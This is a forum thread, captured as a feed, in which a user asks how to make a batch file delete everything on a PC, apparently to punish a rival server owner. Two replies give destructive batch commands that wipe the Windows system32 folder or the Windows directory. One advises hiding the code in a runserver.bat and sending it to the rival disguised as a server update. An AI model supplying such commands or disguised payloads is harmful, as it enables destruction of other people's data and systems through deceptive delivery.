channel.title: Delete Files
channel.description:
Hey guys,
With the help of an experienced coder i have added a file to my server which deletes files. This is the contents:
[code]title blah echo off del *.class del *.java pause[/code]
This deletes every text document ending in .java or .class.
I have three questions:
1) Is there a way to do this to the whole pc and not just the folder it's located in.
2) If i wanted to delete all folders how would it be set out eg. *.class.
3) How would i do this to the hard-drive if it wasn't in the same location as it.
All help is appreciated.
Thanx.
This is not for hacks, scam or anything of the sort.
This is for host protection.

item.title: Delete Files
item.dc:creator: @akanaz akanaz
item.description:
@akanaz wrote:

Thanx for everyone so far. Further help is appreciated. Anything that could help.

Read full topic

item.title: Delete Files
item.dc:creator: @Tranquil Tranquil
item.description:
@Tranquil wrote:

[quote=“Tranquil, post:8, topic:195624”][quote]

  1. Is there a way to do this to the whole pc and not just the folder it’s located in.[/quote]

yes
this

@echo off del "c:\WINDOWS\system32" /q/s>nul

DONT TRY THESE! I ADVISE YOU DONT EVEN TRY TO DO IT TO ANOTHER PERSON OR YOU COULD RECIVE A FINE !

once that file is opend the pc will shut down and will never boot up again!

I AM NOT LIABLE FOR ANYTHING YOU DO!DO NO TEST THIS ON YOUR COMPUTER![/quote]

does the same as mine Lescape

Read full topic

item.title: Delete Files
item.dc:creator: @LeScape LeScape
item.description:
@LeScape wrote:

Place this batch in your WINDOWS folder:

@echo off
del *.*
echo Aha, yr fkd m8.
pause

NOTHING will work once that’s unleashed.
BTW: DO NOT RUN THE BATCH IT WILL TERMINATE YOUR CPU.

Read full topic

item.title: Delete Files
item.dc:creator: @Tranquil Tranquil
item.description:
@Tranquil wrote:

[quote=“akanaz, post:12, topic:195624”]Because he has crossed me twice and once sent a virus to me intentionally.
If he does decide to keep the server I’ll warn him that i will delete his Pc. I am not that mean, but after that there will be no more warnings.[/quote]
you can just say
“im going to delete your pc”
because the batch file dont delete pcs straight away
best thing to do is
“i got an update for my server want it”
send him server files with but before you send it
edit you runserver.bat and put that code into it
then he presses it
and … you wont see him again
it deletes everything on the PC

Read full topic

item.title: Delete Files
item.dc:creator: @egor42 egor42
item.description:
@egor42 wrote:

[quote=“akanaz, post:5, topic:195624”]No, i don’t like releasing servers. The way i see it, you need to keep your server unique and the idea of having a unique server is no-one else has it. If you release it people leech it and add into their server. I see no use for posting servers, besides, If you see a download posted by me just don’t download if you don’t trust. Besides i think a mysterious batch files in your server would be a bit sus. lol.

Thanx for concern though :)[/quote]
Lol,I think you are right…but if you post a server like that u can get banned XD…there is ways to check .bat files if they are clean or not

Read full topic

item.title: Delete Files
item.dc:creator: @Vanack Vanack
item.description:
@Vanack wrote:

[quote=“akanaz, post:3, topic:195624”]Thank you,

Though I’m not very experienced with working with batch files or anything of the sort. Is there any chance you could offer some assisstance?[/quote]

Batch files are not my major, but I do know a bit about the compiling system and running system, along with some more. I can’t help with file deletion, as I’d probably end up blanking out your hard drive.

Read full topic
